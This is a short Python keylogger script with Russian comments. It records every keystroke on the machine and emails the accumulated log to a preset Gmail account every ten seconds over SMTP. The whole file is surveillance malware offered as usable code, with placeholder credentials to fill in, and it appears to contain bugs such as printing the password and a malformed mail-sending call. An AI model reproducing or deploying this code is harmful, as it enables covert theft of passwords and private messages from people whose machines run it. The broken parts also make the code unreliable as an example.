import keyboard #клавиатура
import smtplib #для почты
from threading import Timer #интервал рассылки
from datetime import datetime #интервал расслыки


reportTime = 10 #время в секундах
emailAdress = "YOUR MAIL"
emailPass = "YOUR MAIL PASSWORD"

class Keylogger:
    def __init__(self, interval, reportMethod = "email"):
        self.interval = interval #интервал
        self.reportMethod  = reportMethod #метод отправки
        self.log  = "" #лог
        self.startT = datetime.now() #начало
        self.endT = datetime.now() #окончание
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host = "smtp.gmail.com", port = 587) #сервер
        server.starttls() #подключение по протоколу tls
        print(password, email)
        print(self.log)
        server.login(user = email, password = emailPass) #логин
        server.send_message(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.endT = datetime.now()
            if self.reportMethod == "email":
                self.sendmail(emailAdress, emailPass, self.log)

            self.startT = datetime.now()
        self.log = ""
        timer = Timer(interval = self.interval, function = self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.startT = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

keylogger = Keylogger(interval = reportTime, reportMethod = "email")
keylogger.start()